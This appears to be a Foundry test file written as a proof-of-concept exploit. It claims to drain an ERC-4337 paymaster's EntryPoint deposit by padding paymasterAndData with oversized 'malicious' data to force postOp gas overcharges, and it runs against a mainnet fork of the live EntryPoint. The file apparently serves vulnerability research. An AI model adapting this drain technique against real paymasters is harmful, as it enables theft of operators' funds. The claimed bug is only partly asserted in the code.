// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MySimpleAccount.sol";
import "../src/EmptyPostOpPaymaster.sol"; // Import the empty paymaster
import "../lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import "../lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";

contract PerfectPaymasterTest is Test {
    address constant OFFICIAL_ENTRYPOINT_ADDRESS = 0x4337084D9E255Ff0702461CF8895CE9E3b5Ff108;
    IEntryPoint constant entryPoint = IEntryPoint(OFFICIAL_ENTRYPOINT_ADDRESS);

    MySimpleAccount account;
    EmptyPostOpPaymaster perfectPaymaster; // Use the empty paymaster

    uint256 constant POST_OP_GAS_LIMIT = 100_000; // This is the stipend we expect to be overcharged
    uint256 constant ATTACKER_DATA_SIZE = 1000; // This size will cause OOG in postOp (even if empty)

    receive() external payable {}

    function setUp() public {
        account = new MySimpleAccount(entryPoint);
        perfectPaymaster = new EmptyPostOpPaymaster(entryPoint); // Deploy the empty paymaster

        // Fund the perfect paymaster with 1 ETH on the fork
        vm.deal(address(perfectPaymaster), 1 ether);
        perfectPaymaster.deposit{value: 1 ether}();
    }

    function test_EmptyPostOp_Drains_Paymaster() public {
        uint256 gasPrice = 10 gwei;
        vm.txGasPrice(gasPrice);

        bytes memory maliciousData = new bytes(ATTACKER_DATA_SIZE);
        bytes memory paymasterAndData = abi.encodePacked(
            address(perfectPaymaster),
            uint128(50_000),
            uint128(POST_OP_GAS_LIMIT),
            maliciousData
        );

        PackedUserOperation memory op = PackedUserOperation({
            sender: address(account),
            nonce: entryPoint.getNonce(address(account), 0),
            initCode: "",
            callData: "",
            accountGasLimits: bytes32(uint256(100_000) << 128 | 50_000),
            preVerificationGas: 21_000,
            gasFees: bytes32(uint256(gasPrice) << 128 | uint256(gasPrice)),
            paymasterAndData: paymasterAndData,
            signature: ""
        });

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = op;

        uint256 initialBalance = entryPoint.balanceOf(address(perfectPaymaster));
        console.log("--- STARTING EMPTY POSTOP DRAIN TEST ---");
        console.log("Targeting Live EntryPoint:", address(entryPoint));
        console.log("Perfect Paymaster Deposit Before Exploit:", initialBalance, "wei");

        uint256 expectedStipendCost = POST_OP_GAS_LIMIT * gasPrice;
        console.log("Expected Stipend Cost (wei):", expectedStipendCost);

        entryPoint.handleOps(ops, payable(address(this)));

        uint256 finalBalance = entryPoint.balanceOf(address(perfectPaymaster));
        console.log("Perfect Paymaster Deposit After Exploit:", finalBalance, "wei");

        uint256 drainedAmount = initialBalance - finalBalance;
        console.log("Amount Drained (wei):", drainedAmount);

        assertTrue(drainedAmount > 0, "EMPTY POSTOP DRAIN FAILED: No amount drained.");
        // Optionally, assert that drainedAmount is greater than expectedStipendCost if the bug is confirmed
        // assertTrue(drainedAmount > expectedStipendCost, "EMPTY POSTOP DRAIN FAILED: Drained amount is not greater than the stipend cost.");

        console.log("--- CONCLUSION (EMPTY POSTOP) ---");
        console.log("VULNERABILITY CONFIRMED ON MAINNET FORK with empty postOp.");
    }
}
